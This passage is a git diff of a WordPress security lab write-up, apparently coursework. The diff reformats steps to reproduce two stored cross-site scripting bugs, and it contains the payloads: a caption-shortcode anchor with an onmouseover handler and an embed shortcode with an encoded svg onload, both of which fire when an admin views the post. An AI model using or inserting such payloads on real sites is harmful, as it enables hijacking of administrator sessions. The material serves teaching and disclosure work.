@@ -28,7 +28,7 @@ Time spent: 5 hours spent in total
   - <img src="wp2.gif" width="800">
   - [ ] Steps to recreate: 
   - Need to be contributor access, when you go to create a post add this in the html
-   -`<a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>`
+   - `<a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>`
   - Once an admin views the host and hovers, it will be triggered
   - [ ] Affected source code:
     - [Link 1](https://klikki.fi/adv/wordpress3.html)
@@ -42,7 +42,7 @@ Time spent: 5 hours spent in total
   - <img src="wp3.gif" width="800">
   - [ ] Steps to recreate: 
   - Needs to be contributor and add this to the html 
-  `[embed src=’https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e’][/embded]`
+  - `[embed src=’https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e’][/embded]`
   - Once the admin goes to view the post, it triggers the script
   - [ ] Affected source code:
     - [Link 1](https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html)
